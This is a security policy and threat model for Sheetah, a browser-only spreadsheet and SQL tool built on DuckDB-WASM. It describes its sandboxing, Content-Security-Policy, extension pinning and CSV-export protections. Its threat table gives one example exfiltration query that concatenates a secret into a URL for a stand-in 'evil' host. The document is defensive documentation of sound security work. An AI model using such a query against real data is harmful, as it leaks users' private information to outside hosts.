# Security

Sheetah is a static site. Files are opened and queried inside the browser tab by DuckDB compiled to WebAssembly.
There is no backend, account system or analytics.

## Threat model

| Asset | Where it lives |
|---|---|
| The user's files and query results | Tab memory only (gone on reload), unless the user turns on "Keep my tables" |
| Kept tables (opt-in) | Arrow files in this origin's private file system (OPFS), unencrypted |
| Query history, saved views, settings | `localStorage` on this device (history is optional) |
| The app's own code | Served from this origin; built from this repo on Vercel |

| Threat | Mitigation |
|---|---|
| **Data exfiltration through SQL.** A pasted or shared query like `read_csv('https://evil/?d=' \|\| secret)` makes the engine send data in a URL. | The engine is **sealed** before the app can use it (`src/engine/db.ts`): file access is limited to the virtual `/sheetah/` folder, `enable_external_access = false` turns off URLs and every other path, and `lock_configuration = true` stops SQL from turning any of it back on. Verified with 12 attack queries (URL reads, `ATTACH`, `COPY TO` a URL, re-enabling settings, remote extensions, path traversal): all fail, and the browser makes zero outbound requests. |
| **Exfiltration through the page.** A bug or a compromised dependency calls `fetch`/XHR/beacons/images to another host. | `Content-Security-Policy` (see `vercel.json`): `connect-src 'self'`, `img-src 'self' data: blob:`, `default-src 'self'`, no inline scripts, no `eval` (only `wasm-unsafe-eval`), `form-action 'none'`, `frame-ancestors 'none'`. This is an independent second layer: `fetch`, XHR, images and `blob:` workers to other origins are all refused by the browser. |
| **Remote code at runtime.** Loading DuckDB extensions from a third-party host would run code with access to the user's data. | Extensions are served from this origin only and loaded **before** the engine is sealed; there is no fallback host. The build pins their SHA-256 hashes (`scripts/duckdb-extensions.lock.json`) and fails on mismatch. DuckDB also rejects unsigned or badly signed extensions (`allow_unsigned_extensions` stays off and is locked). |
| **Supply chain.** A malicious or compromised npm release. | Exact versions plus a lockfile, `npm ci --ignore-scripts` in CI, `npm audit --omit=dev` on every push, and Dependabot (engine upgrades are reviewed on their own). |
| **CSV formula injection.** A text cell like `=HYPERLINK(...)` runs when an export is opened in Excel or Sheets. | CSV export is "Excel-safe" by default: text cells starting with `= + - @` (or tab/CR) are prefixed with `'`. You can turn it off for raw output. |
| **Sensitive values at rest.** Queries such as `WHERE email = 'x@y.com'` end up in the history. | History can be switched off ("Remember queries in this browser"), and "Clear all local data" wipes history, saved views and kept tables. Data is only persisted if you opt in to "Keep my tables". |
| **Malicious shared links.** Someone sends a link with a harmful query. | The SQL lives in the URL fragment, which browsers never send to the server, and is stripped from the address bar on open. It is never run automatically: Sheetah shows it for review first. Even if run, the sealed engine and CSP stop it from sending anything anywhere. Decoding is capped at 100 KB and rejects invalid data. |
| **Data at rest from "Keep my tables".** | Off by default; the toggle says the data is stored on this device unencrypted. Turning it off, or "Clear all local data", deletes the folder. OPFS is per-origin, so other sites can't read it. Sample data is never kept. |
| **Stale or tampered offline cache.** | The service worker only caches same-origin files from a build-time manifest, is served `no-cache`, and versions its cache by content hash (old caches are deleted on activate). Pages are fetched network-first, so a fresh deploy wins whenever the network is up. |
| **Clickjacking / framing.** | `frame-ancestors 'none'` and `X-Frame-Options: DENY`. |
| **Cross-origin leaks.** | `Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Resource-Policy: same-origin`, `Referrer-Policy: no-referrer`, `X-Content-Type-Options: nosniff`, and a `Permissions-Policy` that disables camera, microphone, location, USB, serial, HID, payment and MIDI. |

### Out of scope / known limits

- A malicious browser extension or a compromised device can read anything on the page. A web app can't defend against that.
- Very large or malicious archives (`.gz`, `.xlsx` zip bombs) can exhaust the tab's memory. That's a crash, not a leak, and it only affects the tab that opened the file.
- `style-src 'unsafe-inline'` is allowed because the SQL editor and React set inline styles. No inline *scripts* are allowed.
- `worker-src` allows `blob:` because the Excel parser starts helper workers that way. Those workers inherit the same CSP.

## Verifying

- **Headers:** `curl -sI https://<your-deployment>/ | grep -i content-security-policy`
- **No network:** open DevTools → Network, open a file and run queries. Only same-origin static assets load.
- **Sandbox:** run `SELECT * FROM read_csv('https://example.org/x.csv')` in Sheetah. You should get *"file system operations are disabled by configuration"*.

## Reporting a vulnerability

Please open a private security advisory on the GitHub repository (Security → Report a vulnerability) instead of a public issue.
